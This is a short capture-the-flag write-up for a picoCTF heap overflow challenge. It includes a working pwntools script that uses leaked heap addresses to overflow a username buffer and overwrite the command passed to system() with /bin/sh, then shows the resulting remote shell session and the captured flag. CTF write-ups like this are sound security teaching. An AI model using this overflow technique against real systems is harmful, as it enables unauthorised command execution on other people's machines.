# Description
```
This program greets you and then runs a command. But can you take control of what command it executes?
```
---

This exercise we are given leaked addresses of two sequential variables on the heap, where the latter (default: `/bin/pwd`) is used in `system`.  Meaning we need to calculate the diff between them, and overwrite `shell` with `/bin/sh` ; 
```python
from pwn import *  
import re  
  
io = remote("amiable-citadel.picoctf.net", 61793)  
  
pat = re.compile(rb"0x[0-9a-fA-F]{8}")  
  
u = int(pat.search(io.recvline()).group(0), 16)  
s = int(pat.search(io.recvline()).group(0), 16)  
diff = s - u  
log.info(f"username@0x{u:08x} shell@0x{s:08x} | diff={diff}")  
  
io.recvuntil(b"Enter username: ")  
io.sendline(b"A" * diff + b"/bin/sh\x00")  
  
io.interactive()
```

We get:
```shell
[x] Opening connection to amiable-citadel.picoctf.net on port 61793
[x] Opening connection to amiable-citadel.picoctf.net on port 61793: Trying 3.23.68.152
[+] Opening connection to amiable-citadel.picoctf.net on port 61793: Done
[*] username@0x2e39f2a0 shell@0x2e39f2d0 | diff=48
[*] Switching to interactive mode
whoami
ctf-player
ls
flag.txt
cat flag.txt
FLAG{}
```


# Flag
```
picoCTF{us3rn4m3_2_sh3ll_48b038ff}
```